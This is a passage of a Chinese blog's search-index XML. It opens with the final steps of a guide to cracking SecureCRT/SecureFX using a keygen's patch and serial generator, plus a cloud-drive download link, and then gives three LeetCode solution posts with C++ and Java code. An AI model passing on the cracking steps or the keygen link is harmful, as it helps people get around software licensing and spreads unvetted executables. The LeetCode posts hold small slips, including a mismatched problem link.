<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155324737.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后把对应的Serial number和License key填上-》下一步</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155418951.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后把Issue date填上，第二个框不用填-》下一步（注意：这时候左边这个窗口不要关，后面注册SecureFX要用）</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155558451.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>注册完成，点击完成</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155645108.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>选择是否创建口令，看个人吧，这里直接选第二个</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155801170.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后就可以使用了</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/202006211559062.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>3、和第二步同样的步骤，把SecureFX keygen.zip解压然后注册吧</p>
<p>不同的是需要点击patch后—》点击Generate生成序列号等信息，后面和第二步等同</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621162506596.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>百度网盘资源下载：</p>
<p>链接：<a href="https://pan.baidu.com/s/1zCHnCyaL7tACEwv_2XpCEg">https://pan.baidu.com/s/1zCHnCyaL7tACEwv_2XpCEg</a><br>提取码：97z2</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>判定字符是否唯一</title>
    <url>/2020/11/20/%E5%88%A4%E5%AE%9A%E5%AD%97%E7%AC%A6%E6%98%AF%E5%90%A6%E5%94%AF%E4%B8%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>实现一个算法，确定一个字符串 <code>s</code> 的所有字符是否全都不同。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;leetcode&quot;</span><br><span class="line">输出: false </span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;abc&quot;</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>0 &lt;= len(s) &lt;= 100</code></li>
<li>如果你不使用额外的数据结构，会很加分。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>对字符串字符进行升序排序，判断每个字符是否和下一个字符是否相同，如果相同返回false。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败24.64%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isUnique</span><span class="params">(<span class="built_in">string</span> astr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=astr.length();</span><br><span class="line">        <span class="comment">//对字符串字符升序排序</span></span><br><span class="line">        sort(astr.begin(),astr.end());</span><br><span class="line">        <span class="comment">//比较每个字符和下个字符是否相同</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(astr[i]==astr[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，比较简单🧑。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>增减字符串匹配</title>
    <url>/2020/11/20/%E5%A2%9E%E5%87%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/di-string-match/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定只含 <code>&quot;I&quot;</code>（增大）或 <code>&quot;D&quot;</code>（减小）的字符串 <code>S</code> ，令 <code>N = S.length</code>。</p>
<p>返回 <code>[0, 1, ..., N]</code> 的任意排列 <code>A</code> 使得对于所有 <code>i = 0, ..., N-1</code>，都有：</p>
<ul>
<li>如果 <code>S[i] == &quot;I&quot;</code>，那么 <code>A[i] &lt; A[i+1]</code></li>
<li>如果 <code>S[i] == &quot;D&quot;</code>，那么 <code>A[i] &gt; A[i+1]</code></li>
</ul>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;IDID&quot;</span><br><span class="line">输出：[0,4,1,3,2]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;III&quot;</span><br><span class="line">输出：[0,1,2,3]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;DDI&quot;</span><br><span class="line">输出：[3,2,0,1]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= S.length &lt;= 10000</code></li>
<li><code>S</code> 只包含字符 <code>&quot;I&quot;</code> 或 <code>&quot;D&quot;</code>。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据题目分析，字符串中第一个‘D’位置对应的A中的元素值最大为N，第二‘D’对应元素值为N-1，以此顺序依次减小。第一个‘I’位置对应的A中元素值最小为0，第二个‘I’对应元素值加1，以此顺序依次增大，A中最后一个元素在字符串S中没有对应，其值为最后一个‘I’对应元素值加1或最后一个‘D’对应元素值减1。遍历字符串，对字符的不同值‘I’或‘D’进行相应处理。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败40.65%，内存消耗9.2M，击败16.95%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">diStringMatch</span><span class="params">(<span class="built_in">string</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">int</span> N=S.length();</span><br><span class="line">        <span class="keyword">int</span> little=<span class="number">0</span>,big=S.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:S)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="string">&#x27;I&#x27;</span>)&#123;</span><br><span class="line">                result.emplace_back(little);</span><br><span class="line">                ++little;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result.emplace_back(big);</span><br><span class="line">                --big;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        result.emplace_back(little);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/di-string-match/solution/zeng-jian-zi-fu-chuan-pi-pei-by-leetcode/">官方题解</a>:</h6><p><strong>分析</strong></p>
<p>我们首先考虑字符串中的第一个字母。如果 <code>S[0] == &#39;I&#39;</code>，那么我们只要令 <code>A[0] = 0</code>，就一定能满足 <code>A[0] &lt; A[1]</code>。如果 <code>S[0] == &#39;D&#39;</code>，同样我们只要令 <code>A[0] = N</code>，就一定能满足 <code>A[0] &gt; A[1]</code>。</p>
<p>接下来，当我们考虑 <code>S</code> 中剩下的 <code>N - 1</code> 个字母时，还剩下 <code>N</code> 个数可以使用，这 <code>N</code> 个数为 <code>[0 .. N - 1]</code> 或 <code>[1 .. N]</code>。可以发现，由于 <code>S[0]</code> 的值已经确定，那么剩下 <code>S</code> 中的 <code>N - 1</code> 个字母和 <code>N</code> 个可用的数变成了一个和原问题相同，但规模为 <code>N - 1</code> 的问题。即如果 <code>S[1] == &#39;I&#39;</code>，我们就令 <code>A[1]</code> 为剩下数中最小的那个数；如果 <code>S[1] == &#39;D&#39;</code>，我们就令 <code>A[1]</code> 为剩下数中最大的那个数。</p>
<p>我们每次会把可以使用的数的集合中的最小值或最大值取出，并放到当前的位置，因此可以使用的数的集合总是连续的，就可以非常方便的进行维护。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] diStringMatch(String S) &#123;</span><br><span class="line">        <span class="keyword">int</span> N = S.length();</span><br><span class="line">        <span class="keyword">int</span> lo = <span class="number">0</span>, hi = N;</span><br><span class="line">        <span class="keyword">int</span>[] ans = <span class="keyword">new</span> <span class="keyword">int</span>[N + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (S.charAt(i) == <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">                ans[i] = lo++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans[i] = hi--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ans[N] = lo;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是字符串 <code>S</code> 的长度。</li>
<li>空间复杂度：$O(N)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解虽然分析过程和我描述的有些差别，但思路是一致的，代码也基本相同，不过官方题解是Java实现的，题目也还好，比较容易想到👦。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵中的幸运数</title>
    <url>/2020/11/20/%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E5%B9%B8%E8%BF%90%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/lucky-numbers-in-a-matrix/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个 <code>m * n</code> 的矩阵，矩阵中的数字 <strong>各不相同</strong> 。请你按 <strong>任意</strong> 顺序返回矩阵中的所有幸运数。</p>
<p>幸运数是指矩阵中满足同时下列两个条件的元素：</p>
<ul>
<li>在同一行的所有元素中最小</li>
<li>在同一列的所有元素中最大</li>
</ul>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：matrix &#x3D; [[3,7,8],[9,11,13],[15,16,17]]</span><br><span class="line">输出：[15]</span><br><span class="line">解释：15 是唯一的幸运数，因为它是其所在行中的最小值，也是所在列中的最大值。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：matrix &#x3D; [[1,10,4,2],[9,3,8,7],[15,16,17,12]]</span><br><span class="line">输出：[12]</span><br><span class="line">解释：12 是唯一的幸运数，因为它是其所在行中的最小值，也是所在列中的最大值。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：matrix &#x3D; [[7,8],[1,2]]</span><br><span class="line">输出：[7]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>m == mat.length</code></li>
<li><code>n == mat[i].length</code></li>
<li><code>1 &lt;= n, m &lt;= 50</code></li>
<li><code>1 &lt;= matrix[i][j] &lt;= 10^5</code></li>
<li>矩阵中的所有元素都是不同的</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>暴力解法：遍历每一行，求出当前行中的最小元素，然后判断这个元素是否是所在列中的最大值，如果是则是幸运数，否则不是幸运数。</p>
<p><strong>c++代码：</strong>(执行用时68ms，击败5.15%，内存消耗11.5M，击败17.44%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">luckyNumbers</span> <span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">int</span> m=matrix.size();</span><br><span class="line">        <span class="keyword">int</span> n=matrix[<span class="number">0</span>].size();</span><br><span class="line">        <span class="comment">//遍历每一行</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;++i)&#123;</span><br><span class="line">            <span class="comment">//求出每一行的最大值</span></span><br><span class="line">            <span class="keyword">int</span> row_min=INT_MAX;</span><br><span class="line">            <span class="comment">//每一行最小值的列索引</span></span><br><span class="line">            <span class="keyword">int</span> min_j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j]&lt;row_min)&#123;</span><br><span class="line">                    row_min=matrix[i][j];</span><br><span class="line">                    min_j=j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//判断当前行最小值是否是所在列最大的，即是否是幸运数</span></span><br><span class="line">            <span class="keyword">int</span> col_max=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;m;++k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(row_min&lt;matrix[k][min_j])&#123;</span><br><span class="line">                    <span class="comment">//不是幸运数</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(k==m<span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="comment">//在当前列中最大，是幸运数</span></span><br><span class="line">                    result.push_back(row_min);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/lucky-numbers-in-a-matrix/solution/ju-zhen-zhong-de-xing-yun-shu-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>预处理出两个数组 <code>rMin</code> 和 <code>cMax</code>，其中 <code>rMin[i]</code> 表示第 $i$ 行中最小的元素，<code>cMax[j]</code> 表示第 $j$ 列中最大的元素。接着遍历矩阵 <code>matrix</code>，判断每个 <code>matrix[i][j]</code> 是否是这一行最小的并且是这一列最大的，具体方法是直接与 <code>rMin[i]</code> 和 <code>cMax[j]</code> 比较，如果都相等，就加入到答案的序列中。</p>
<p>思考：<code>rMin</code> 和 <code>cMax</code> <strong>是否可以存放「行最小值」和「列最大值」的索引？</strong> 答案是可以。但是如果原题中没有说明「矩阵中的数字 <strong>各不相同</strong>」就不能这么干，因为假设第 rr 行的「行最小值」出现两次，索引为 $c_1$ 和 $c_2$c ，却只保存了一个索引 $c_1$，$c_2$位置的这个数满足它是「列最大值」，这个时候就会判断出错。</p>
<p><strong>c++代码：</strong>(执行用时60ms，击败5.15%，内存消耗11.6M，击败7.41%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">luckyNumbers</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r = matrix.size(), c = matrix[<span class="number">0</span>].size();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">rMin</span><span class="params">(r, INT_MAX)</span></span>;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">cMax</span><span class="params">(c, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; c; ++j) &#123;</span><br><span class="line">                rMin[i] = min(rMin[i], matrix[i][j]);</span><br><span class="line">                cMax[j] = max(cMax[j], matrix[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; c; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] == rMin[i] &amp;&amp; matrix[i][j] == cMax[j]) &#123;</span><br><span class="line">                    ans.push_back(matrix[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：预处理的时间代价是 $O(mn)$，统计答案的时间代价也是 $O(mn)$，故渐进时间复杂度为 $O(mn)$。</p>
</li>
<li><p>空间复杂度：这里用到了两个辅助数组 <code>rMin</code>​ 和 <code>cMax</code>​，长度分别为 $m$ 和 $n$，故渐进空间复杂度为 $O(m + n)$。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>本来我觉得暴力模拟解法太low了，想看看题解有没有什么更好的方法，结果官方题解也是暴力模拟🤣，不过官方题解和我的还是有一些不一样，他是先求出每行的最小值和每列的最大值，我是求出每行的最小值后再去判断是否是该列的最大值，他是并列关系，我是递进关系，不过效率也都差不多😗。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
</search>
